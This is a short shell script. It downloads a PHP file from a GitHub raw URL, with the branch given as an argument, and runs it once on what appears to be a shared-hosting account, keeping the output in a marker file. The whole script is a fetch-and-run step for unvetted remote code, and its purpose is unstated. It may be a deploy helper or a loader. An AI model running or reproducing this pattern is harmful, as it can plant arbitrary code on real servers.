#!/bin/sh
cd /home/u791571885 && [ -f t168.done ] || { curl -fsSL -o t168.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs168.php" && /opt/alt/php83/usr/bin/php t168.php > t168.done 2>&1; }
head -c 9000 t168.done
